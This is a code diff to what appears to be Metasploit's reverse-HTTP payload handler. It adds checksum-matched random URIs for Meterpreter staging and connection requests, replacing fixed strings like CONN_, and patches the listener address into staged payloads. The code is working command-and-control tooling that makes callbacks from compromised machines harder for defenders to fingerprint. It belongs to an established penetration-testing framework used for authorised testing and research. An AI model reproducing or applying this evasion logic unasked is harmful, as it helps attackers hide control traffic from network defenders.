@@ -30,6 +30,49 @@ module ReverseHttp
 	end
 
 	#
+	# Define 8-bit checksums for matching URLs
+	# These are based on charset frequency
+	#
+	URI_CHECKSUM_INITW = 92
+	URI_CHECKSUM_INITJ = 88
+	URI_CHECKSUM_CONN  = 98
+	
+	#
+	# Map "random" URIs to static strings, allowing us to randomize
+	# the URI sent in the first request.
+	# 
+	def process_uri_resource(uri_match)
+		# This allows 'random' strings to be used as markers for
+		# the INIT and CONN request types, based on a checksum
+		uri_strip, uri_conn = uri_match.split('_', 2)
+		uri_strip.sub!(/^\//, '')
+		uri_check = Rex::Text.checksum8(uri_strip)
+		
+		# Match specific checksums and map them to static URIs
+		case uri_check
+		when URI_CHECKSUM_INITW
+			uri_match = "/INITM" 
+		when URI_CHECKSUM_INITJ
+			uri_match = "/INITJM"
+		when URI_CHECKSUM_CONN
+			uri_match = "/CONN_" + ( uri_conn || Rex::Text.rand_text_alphanumeric(16) )
+		end 
+		
+		uri_match
+	end
+	
+	#
+	# Create a URI that matches a given checksum
+	#
+	def generate_uri_checksum(sum)
+		0.upto(1000) do 
+			uri = Rex::Text.rand_text_alphanumeric(4)
+			return uri if Rex::Text.checksum8(uri) == sum
+		end
+		raise RuntimeError, "Unable to generate a string with checksum #{sum}"
+	end
+	
+	#
 	# Initializes the HTTP SSL tunneling handler.
 	#
 	def initialize(info = {})
@@ -139,13 +182,15 @@ protected
 		end
 		
 		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-
+		
+		uri_match = process_uri_resource(req.relative_resource)
+		
 		# Process the requested resource.
-		case req.relative_resource
+		case uri_match
 			when /^\/INITJM/
 				print_line("Java: #{req.relative_resource}")
 
-				conn_id = "CONN_" + Rex::Text.rand_text_alphanumeric(16)
+				conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
 				url = "http://#{lhost}:#{datastore['LPORT']}/" + conn_id + "/\x00"
 				print_line "URL: #{url.inspect}"
 
@@ -192,7 +237,7 @@ protected
 				end
 				print_status("Patched transport at offset #{i}...")
 
-				conn_id = "CONN_" + Rex::Text.rand_text_alphanumeric(16)
+				conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
 				i = blob.index("https://" + ("X" * 256))
 				if i
 					url = "http://#{lhost}:#{datastore['LPORT']}/" + conn_id + "/\x00"
@@ -248,7 +293,7 @@ protected
 					})
 				end
 			else
-				print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{req.relative_resource} #{req.inspect}...")
+				print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{uri_match} #{req.inspect}...")
 				resp.code    = 200
 				resp.message = "OK"
 				resp.body    = "<h3>No site configured at this address</h3>"
@@ -265,4 +310,3 @@ end
 
 end
 end
-
